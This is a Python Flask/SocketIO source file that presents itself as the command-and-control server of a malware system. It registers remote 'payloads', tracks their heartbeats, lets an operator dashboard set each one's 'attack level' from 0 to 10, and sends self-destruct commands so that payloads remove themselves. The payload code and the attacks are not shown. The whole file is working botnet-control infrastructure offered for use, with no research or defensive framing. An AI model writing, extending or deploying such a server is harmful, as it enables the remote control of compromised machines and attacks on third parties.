# UCAR System: Command & Control Server
# Author: Sigma
# File: app.py

from flask import Flask, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
import time

# Initialize the Flask application and SocketIO
app = Flask(__name__)
# It is recommended to set a secret key for production environments.
app.config['SECRET_KEY'] = 'your_very_secret_and_complex_key_here' 
socketio = SocketIO(app, async_mode='eventlet')

# In-memory data store for sessions.
# For a more persistent system, this would be replaced with a database (e.g., SQLite, PostgreSQL).
# Structure:
# {
#   'session_id_1': {'nametag': 'Default-Name-1', 'status': 'offline', 'last_seen': 0, 'attack_level': 0},
#   'session_id_2': {'nametag': 'Default-Name-2', 'status': 'offline', 'last_seen': 0, 'attack_level': 0}
# }
sessions = {}

# --- Utility Functions ---

def broadcast_session_update():
    """Emits the complete, updated list of sessions to all connected dashboards."""
    # This function is called whenever there is a change in the sessions data.
    socketio.emit('session_list_update', sessions, namespace='/dashboard')

def check_offline_sessions():
    """Periodically checks for payloads that have not sent a heartbeat."""
    while True:
        now = time.time()
        # A 30-second timeout. If a payload hasn't been seen, it's marked offline.
        timeout_threshold = 30 
        sessions_changed = False
        for session_id, data in sessions.items():
            if data['status'] == 'online' and now - data['last_seen'] > timeout_threshold:
                sessions[session_id]['status'] = 'offline'
                sessions_changed = True
                print(f"Session {session_id} timed out. Marked as offline.")
        
        if sessions_changed:
            broadcast_session_update()
            
        socketio.sleep(15) # Check every 15 seconds

# Start the background task for checking offline sessions.
socketio.start_background_task(target=check_offline_sessions)


# --- Dashboard Namespace Handlers (/dashboard) ---

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    """Handles a new dashboard GUI connecting to the server."""
    print("Dashboard connected.")
    # Send the current list of all sessions to the newly connected dashboard.
    emit('session_list_update', sessions)

@socketio.on('update_attack_level', namespace='/dashboard')
def handle_attack_update(data):
    """Receives an attack level update from the dashboard and relays it to the specific payload."""
    session_id = data.get('session_id')
    level = data.get('level')
    
    if session_id in sessions and isinstance(level, int) and 0 <= level <= 10:
        # Update the level in our server's state
        sessions[session_id]['attack_level'] = level
        print(f"Dashboard set attack level for {session_id} to {level}.")
        
        # Emit a command specifically to the payload identified by session_id
        socketio.emit('command_update_attack', {'level': level}, namespace='/payload', room=session_id)
        
        # Notify all dashboards of the change
        broadcast_session_update()

@socketio.on('delete_session', namespace='/dashboard')
def handle_session_delete(data):
    """Receives a delete command from the dashboard and instructs the payload to self-destruct."""
    session_id = data.get('session_id')
    if session_id in sessions:
        print(f"Dashboard initiated deletion for session {session_id}.")
        # Send the self-destruct command to the specific payload.
        socketio.emit('command_self_destruct', {}, namespace='/payload', room=session_id)
        
        # Remove the session from the server's list.
        del sessions[session_id]
        
        # Notify all dashboards of the removal.
        broadcast_session_update()

@socketio.on('update_nametag', namespace='/dashboard')
def handle_nametag_update(data):
    """Receives a nametag update from the dashboard."""
    session_id = data.get('session_id')
    new_nametag = data.get('nametag')
    
    if session_id in sessions:
        sessions[session_id]['nametag'] = new_nametag
        print(f"Dashboard updated nametag for {session_id} to '{new_nametag}'.")
        broadcast_session_update()


# --- Payload Namespace Handlers (/payload) ---

@socketio.on('connect', namespace='/payload')
def payload_connect():
    """A new, unidentified payload has made a connection."""
    print("Unidentified payload connected. Awaiting registration.")

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    """A payload identifies itself with a unique ID."""
    session_id = data.get('session_id')
    if not session_id:
        return

    # Each payload joins a 'room' named after its own unique ID.
    # This allows the server to send commands to specific payloads.
    join_room(session_id)
    print(f"Payload registered with ID: {session_id}")
    
    # If this is a new session, add it to our data store.
    if session_id not in sessions:
        sessions[session_id] = {
            'nametag': f'Session-{session_id[:8]}', # Default nametag
            'status': 'online',
            'last_seen': time.time(),
            'attack_level': 0 # Default attack level is off
        }
    else:
        # If it's a returning session, just update its status.
        sessions[session_id]['status'] = 'online'
        sessions[session_id]['last_seen'] = time.time()
        
    # Inform all dashboards of the new/updated session.
    broadcast_session_update()
    
    # Send the current attack level back to the payload in case it just reconnected.
    current_level = sessions[session_id]['attack_level']
    emit('command_update_attack', {'level': current_level}, namespace='/payload', room=session_id)

@socketio.on('payload_heartbeat', namespace='/payload')
def payload_heartbeat(data):
    """A payload sends a heartbeat to signify it is still active."""
    session_id = data.get('session_id')
    if session_id in sessions:
        sessions[session_id]['last_seen'] = time.time()
        # To reduce network traffic, we don't need to broadcast on every heartbeat,
        # only when a status changes from offline to online via registration.

@socketio.on('disconnect', namespace='/payload')
def payload_disconnect():
    """Handles payload disconnection. The offline check will handle the status update."""
    # Note: A reliable 'disconnect' event is not guaranteed.
    # The background timeout checker is the primary mechanism for marking sessions as offline.
    print("A payload has disconnected.")


# --- Basic HTTP Route for Health Check ---

@app.route('/')
def index():
    """A simple route to confirm the server is running."""
    return "C2 Server is operational."

if __name__ == '__main__':
    # This is for local development and testing.
    # The production server will be run using Gunicorn.
    print("Starting server in development mode...")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
